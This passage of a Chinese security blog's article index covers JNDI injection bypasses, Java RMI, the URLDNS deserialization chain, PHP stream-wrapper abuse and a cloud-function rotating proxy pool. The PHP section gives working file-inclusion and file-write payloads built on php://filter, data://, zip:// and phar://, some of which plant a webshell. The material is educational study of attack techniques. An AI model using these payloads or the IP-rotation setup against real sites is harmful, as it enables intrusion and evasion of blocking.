javax.el.ELProcessor 的构造器进行实例化，获取了一个 javax.el.ELProcessor 对象 这里的操作其实就是获取了引用对象的 forceString 引用类型的值，也就是 x=eval，这里用逗号分隔成数组，应该是可以使用逗号传递多个引用值的，这里只有一个，然后就是获取了 = 这个字符出现的位置 再往下，就是获取了 = 字符前面和后面的字符串，分别是eval和x，forced是个HashMap类型的，把x作为键，通过反射获取 javax.el.ELProcessor 的eval方法作为值添加进去 这里获取了引用对象中的所有引用地址 再继续往下就是一直循环判断引用类型是否匹配，匹配的话就跳出循环进行下一次循环，否则继续往下执行。直到遍历到x引用类型，不匹配，则往下执行 获取了x引用类型的引用值后，又获取了在上面forced的x键值，也就是eval方法 在211行真正的进行了方法调用，变量 bean 就是 javax.el.ELProcessor 实例化的对象，valueArray则是x引用地址的引用值，也就是需要执行的恶意命令，通过反射进行了方法调用 最后，调用后成功执行了我们恶意服务端上的代码 高版本其他绕过方式除了上面的 ELProcessor 的方式绕过，还有其他的方法，这里就不再做调试分析了，原理都大差不差 GroovyClassLoader依赖： 恶意服务端： 受害者服务端： 参考链接 浅析JNDI注入 [ Mi1k7ea ]  高版本JDK下的JNDI注入浅析 - 先知社区  探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖"},{"title":"Java RMI远程方法调用","date":"2022-07-20T03:29:51.236Z","url":"/403f70182d22.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["RMI","/tags/RMI/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"简介 RMI全称是 Remote Method Invocation，远程⽅法调⽤。让某个Java虚拟机上的对象调⽤另⼀个Java虚拟机中对象上的⽅法，RMI是Java独有的⼀种机制。 实现RMI Server的三部分： 创建一个继承了 java.rmi.Remote 的接口，在该接口中定义需要远程调用的函数。 创建一个实现了此接口的类，并继承 UnicastRemoteObject 类。 此实现接口类创建RMI注册表Registry的方法，将实现接口类进行实例化并绑定到RMI注册表中，并调用该方法启动RMI服务。 RMI具体实现代码 运行RMIServer类后，再运行RMIClient类，成功通过RMI调用远程对象方法。 这里借用一张图来看这次RMI远程调用方法的整个过程： RMI Registry像是一个路由网关，在RMIServer类上创建RMI注册表Registry绑定对象的关系，RMIClient通过Naming查询RMI Registry注册表的绑定关系，连接RMIServer，远程方法在RMIServer上调用。"},{"title":"URLDNS利用链","date":"2022-06-22T08:35:17.669Z","url":"/c180fda4a6eb.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["URLDNS","/tags/URLDNS/"]],"categories":[["Java安全","/categories/Java%E5%AE%89%E5%85%A8/"]],"content":"利用链 URLDNS利用链如下： HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URL.getHostAddress() -&gt; URL.getByName() 利用链分析Java中Map集合有Key和Value，可以接受任何数据类型的数据。入口类的参数是可控的并且可以是任意类或对象。 其中HashMap是Map接口的实现类，它继承了Serializable，HashMap是可被序列化的。 在HashMap重写了 readyObject 方法 在 readObject 方法中调用了 putVal 方法，在 putVal 方法中调用了 hash 方法 继续跟进，调用了 hash 方法中的 key 参数对象的 hashCode 方法 这里，参数是哪个对象就会调用哪个对象的 hashCode 方法 Java中的 URL 类，重写了 hashCode 方法并且可以DNS请求 找到 URL 类，重写了 hashCode 方法 这里的逻辑是，当 hashCode 变量为 -1 时才会执行到 handler.hashCode() 方法 handler 变量是 URLStreamHandler 类 找到 URLStreamHandler 类中的 hashCode 方法 调用了 getHostAddress 方法 再继续跟进，getByName 方法可以发起DNS请求 到这里，我们就理清楚URLDNS链的整个过程了。 利用链利用在上面，我们说到 hashCode 变量为 -1 是才会执行 handler.hashCode() 方法，该变量默认为 -1，那么在利用时就会出现一个问题，在执行 HashMap.put 方法时就会进行一次请求，无法确认是在反序列化时进行的DNS请求还是在序列化HashMap类时，HashMap的put方法导致的DNS请求。 先对 hashMap 对象进行序列化生成 obj.ser 文件 当程序接受一个序列化对象文件并反序列化操作时就读取了序列化的 HashMap 对象，此时 HashMap 的 hashCode 值为 -1 ，即可进行DNS查询。"},{"title":"PHP常见的利用协议","date":"2022-01-12T03:46:40.167Z","url":"/de9f49bb405f.html","tags":[["PHP","/tags/PHP/"],["协议","/tags/%E5%8D%8F%E8%AE%AE/"]],"categories":[["技术分享","/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":" PHP伪协议就是PHP支持的一些协议，并且封装起来使用的协议，就叫伪协议 file:&#x2F;&#x2F; file协议用来访问本地系统文件的，在渗透测试中常用来读取系统文件 条件： allow_url_include 为 On 这里的协议比较容易理解，和访问本地系统文件一样读取就可以了 file://C:\\\\windows\\\\win.ini php:&#x2F;&#x2F;php:&#x2F;&#x2F;filter 这种协议一般出现在PHP的文件读取写入函数中 条件： allow_url_include 为 On 简单理解一下这个协议，它能够处理数据流，比如读取文件时通过base64进行加密输出 php://filter/read=convert.base64-encode/resource=../../config/database.php 再来看个例子，也是实战中比较多的 在写入文件之前，加入一个PHP的退出函数 输入Payload为 txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=a.php 时报错了 这是由于base64编码，在解码时是4个字节为一组，如果不足在编码前补充对应字符 txt=bbPD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php 此时成功写入 还有一个方法，使用这个协议的 string.strip_tags 方法，XML遇到PHP标签时，会解析成XML标签，使用这个方法可以删除这个标签，然后再处理输入流 txt=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php 详细过程看： php:&#x2F;&#x2F;input 输入流input，访问请求的原始输入流，当 enctype=&quot;multipart/form-data&quot; 的时候，php:&#x2F;&#x2F;input 是无效的，只要 enctype 值不是 multipart/form-data ，这个协议就管用 条件： allow_url_include 为 On enctype 值不为 multipart/form-data 看一个例子 这里就可以使用 php://input 协议 这里有一个很疑惑的点，输入流原始数据必须符合参数化形式，不然不会被执行，网上很多文章都是不需要的，PHP5.4版本貌似没用 data:&#x2F;&#x2F; data:// 数据流封装器，漏洞出现在PHP文件包含处 条件： allow_url_include 为 On allow_url_fopen 为 On ?p=data://text/plain;base64,YWFhYWFhYQ== 该协议常用来封装数据，可以使用base64进行加密传输，输出时可自动解密为明文 aaaaaaa ?p=data://text/plain,&lt;?php phpinfo();?&gt; ?p=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B 在base64编码后，需要对base64编码特殊字符做URL编码，否则浏览器识别不了 zip:&#x2F;&#x2F; zip:// 伪协议的格式为 zip://[压缩文件路径]#[压缩文件内的子文件名] 将PHP文件放在一个文件夹中，将这个文件夹压缩成ZIP格式，再将压缩文件后缀改为 .jpg 这里需要注意的是 # 需要进行URL编码 常用于在文件包含中使用 ?p=zip://a.jpg%231.php 将1.php写成一句话木马，通过Webshell管理工具进行连接 phar:&#x2F;&#x2F; phar 是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 在这里，我测试了很多网上的方法，只测试成功了一个 首先，这里要创建一个 phar ，在本地写好并且运行创建 在本地创建的时候注意了，将 php.ini 中的 phar.readonly 设置为Off，否则无法生成phar文件 使用命令 php 1.php 执行后，会在当前目录生成一个 a.zip 文件 a.zip 为创建的phar文件名，这里使用的是 zip 格式，读取一句话木马文件 a.php 写入到phar压缩包中的 a.jpg 中 若文件包含可控，直接传入参数 phar://a.zip/a.jpg 即可执行我们想要执行的代码 还有一些其他操作："},{"title":"云函数的代理IP利用面","date":"2021-08-02T06:27:47.000Z","url":"/618dcd2c2088.html","tags":[["云函数","/tags/%E4%BA%91%E5%87%BD%E6%95%B0/"],["代理IP","/tags/%E4%BB%A3%E7%90%86IP/"]],"categories":[["技术分享","/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"0x01 前言什么是云函数？云函数（Serverless Cloud Function，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码， 是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF 平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。 为什么通过云函数代理IP？这是因为云函数会自动的在同一个地域内的多个可用区部署，在请求目标时，会自动调用不同的可用区的IP地址。这样一来，每次请求IP会发生改变，也就达到了我们想要建立一个代理池的目的。 0x02 构建云函数代理池本地环境系统：macOS Big Sur Python版本：3.7.7 代理客户端：mitmproxy 云函数厂商：腾讯云 配置云函数新建云函数 选择自定义部署，运行环境为 Python ，通过在线编辑，将 SCFProxy 工具中的 server.py 文件代码替换进去，然后点击完成会自动部署 创建触发器 按照图示，依次选择创建API网关触发器 将访问路径记下 修改代理客户端配置 打开 SCFProxy 工具目录下的 HTTP，编辑 client.py 文件，将API网关触发器中的访问路径地址加入到 scf_servers 中 0x03 本地代理 本文章使用的代理客户端为 mitmproxy ，由于使用的是Python脚本处理代理请求，还需要使用pip安装 mitmproxy 模块（建议在官网下载对应的whl文件进行安装），这里需要注意安装对应版本的 mitmproxy 否则可能会出现一些问题。本文使用代理客户端的版本是 7.0.0，Python模块版本是：7.0.0。 为了方便，我将 client.py 文件复制到了 mitmproxy 工具目录中 然后执行 ./mitmdump -s client.py -p 8081 --no-http2 即可在本地端口8081上开启代理 通过浏览器代理工具进行代理，代理协议为 HTTP 代理服务器为 127.0.0.1 代理端口为 8081 浏览器代理后，可以看到IP地址也变了，每次请求IP地址都会变化 可以看到访问网页的请求都会经过云函数请求返回到本地 0x04 参考资料链接【干货】利用云函数实现免费IP代理 利用云函数（SCF）打造海量代理池 工具mitmproxy SCFProxy"},{"title":"About Me","date":"2023-08-25T16:39:11.780Z","url":"/about/index.html","categories":[[" ",""]],"content":"喜欢研究Java安全、安全开发、红队方向的内容 如若文章中内容存在错误，希望各位佬们指正 Wechat：Nzc2OTZjNjU3OTczNjU2Mw&#x3D;&#x3D;"},{"title":"Search","date":"2023-08-09T01:51:52.324Z","url":"/search/index.html","categories":[[" ",""]]},{"title":"Tags","date":"2023-08-09T01:51:17.620Z","url":"/tags/index.html","categories":[[" ",""]]},{"title":"Links","date":"2023-08-09T01:50:54.648Z","url":"/links/index.html","categories":[[" ",""]]},{"title":"Archives","date":"2023-08-09T01:55:34.217Z","url":"/archives/index.html","categories":[[" ",""]]}]